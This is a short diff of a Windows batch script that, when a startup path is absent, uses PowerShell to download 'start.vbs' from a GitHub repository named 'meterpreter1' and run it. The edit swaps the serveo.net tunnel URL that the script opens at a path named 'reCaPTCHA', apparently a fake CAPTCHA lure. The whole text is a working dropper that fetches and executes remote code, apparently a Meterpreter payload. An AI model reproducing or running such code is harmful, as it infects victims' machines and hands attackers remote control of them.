@@ -8,4 +8,4 @@ if not exist "%startupPath%" (
     powershell -Command ^
         "try { (New-Object System.Net.WebClient).DownloadFile('https://raw.githubusercontent.com/0x2034/meterpreter1/main/start.vbs', 'start.vbs'); Start-Process 'start.vbs' } catch { Write-Output 'Failed to download or start the file. Error: $_' }"
 )
-start https://342f6ee14e72d96973fef3ebdcb2d785.serveo.net/reCaPTCHA/r.html
+start https://c4fa84a840f1d382df40110cbba8fc76.serveo.net/reCaPTCHA/r.html
